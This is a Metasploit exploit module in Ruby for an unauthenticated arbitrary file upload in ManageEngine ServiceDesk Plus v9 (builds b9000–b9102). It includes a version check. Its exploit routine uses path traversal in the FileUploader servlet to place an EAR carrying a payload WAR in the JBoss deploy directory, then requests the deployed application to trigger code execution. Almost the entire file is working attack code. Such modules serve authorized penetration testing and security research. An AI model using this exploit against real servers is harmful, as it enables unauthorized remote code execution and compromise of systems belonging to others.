##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'ManageEngine ServiceDesk Plus Arbitrary File Upload',
      'Description' => %q{
        This module exploits a file upload vulnerability in ManageEngine ServiceDesk Plus.
        The vulnerability exists in the FileUploader servlet which accepts unauthenticated
        file uploads. This module has been tested successfully on versions v9 b9000 - b9102
        in Windows and Linux. The MSP versions do not expose the vulnerable servlet.
      },
      'Author'       =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>', # Vulnerability Discovery and Metasploit module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'ZDI', '15-396 ' ],
          [ 'URL', 'GITHUB_URL' ],
          [ 'URL', 'FULLDISC_URL' ]
        ],
      'DefaultOptions' => { 'WfsDelay' => 30 },
      'Privileged'  => false,            # Privileged on Windows but not on Linux targets
      'Platform'    => 'java',
      'Arch'        => ARCH_JAVA,
      'Targets'     =>
        [
          [ 'ServiceDesk Plus v9 b9000 - b9102 / Java Universal', { } ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Aug 20 2015'))

    register_options(
      [
        Opt::RPORT(8080),
        OptInt.new('SLEEP',
          [true, 'Seconds to sleep while we wait for EAR deployment', 15]),
      ], self.class)
  end


  def check
    res = send_request_cgi({
      'uri'    => "/",
      'method' => 'GET'
    })

    if res && res.code == 200 &&
     res.body.to_s =~ /src='\/scripts\/Login\.js\?([0-9]+)'><\/script>/
      build = $1
      if build < "9103" && build > "9000"
        return Exploit::CheckCode::Appears
      end
    end

    return Exploit::CheckCode::Safe
  end


  def exploit
    jboss_path = '../../server/default/deploy'
    servlet_path = rand_text_alphanumeric(4 + rand(16 - 4)) + ".up"

    # First we generate the WAR with the payload...
    war_app_base = rand_text_alphanumeric(4 + rand(32 - 4))
    war_payload = payload.encoded_war({ :app_name => war_app_base })

    # ... and then we create an EAR file with it.
    ear_app_base = rand_text_alphanumeric(4 + rand(32 - 4))
    app_xml = %Q{<?xml version="1.0" encoding="UTF-8"?><application><display-name>#{rand_text_alphanumeric(4 + rand(32 - 4))}</display-name><module><web><web-uri>#{war_app_base + ".war"}</web-uri><context-root>/#{ear_app_base}</context-root></web></module></application>}

    # Zipping with CM_STORE to avoid errors while decompressing the zip
    # in the Java vulnerable application
    ear_file = Rex::Zip::Archive.new(Rex::Zip::CM_STORE)
    ear_file.add_file(war_app_base + ".war", war_payload.to_s)
    ear_file.add_file("META-INF/application.xml", app_xml)
    ear_file_name = rand_text_alphanumeric(4 + rand(32 - 4)) + ".ear"

    # Linux doesn't like it when we traverse non existing directories,
    # so let's create them by sending some random data before the EAR.
    rand_file = rand_text_alphanumeric(4 + rand(32 - 4))
    res = send_request_cgi({
      'uri' => normalize_uri(servlet_path),
      'method' => 'POST',
      'data' => rand_text_alphanumeric(4 + rand(32 - 4)),
      'ctype' => 'application/octet-stream',
      'vars_get' => {
        'uniqueId' => rand_text_numeric(4 + rand(4)),
        'module' => '',
        'qqfile' => rand_file
      }
    })

    print_status("#{peer} - Uploading EAR file...")
    res = send_request_cgi({
      'uri' => normalize_uri(servlet_path),
      'method' => 'POST',
      'data' => ear_file.pack,
      'ctype' => 'application/octet-stream',
      'vars_get' => {
        'uniqueId' => rand_text_numeric(4 + rand(4)),
        'module' => jboss_path,
        'qqfile' => ear_file_name
      }
    })

    if res && res.code == 200
      print_status("#{peer} - Upload appears to have been successful, waiting " + datastore['SLEEP'].to_s +
      " seconds for deployment")
      register_files_for_cleanup(jboss_path.gsub('../../','../') + "/null/" + ear_file_name)
      register_files_for_cleanup("Attachments/null/" + rand_file)
      sleep(datastore['SLEEP'])
    else
      fail_with(Failure::Unknown, "#{peer} - EAR upload failed")
    end

    send_request_cgi({
      'uri'    => normalize_uri(ear_app_base, war_app_base, Rex::Text.rand_text_alpha(rand(8)+8)),
      'method' => 'GET'
    })
  end
end
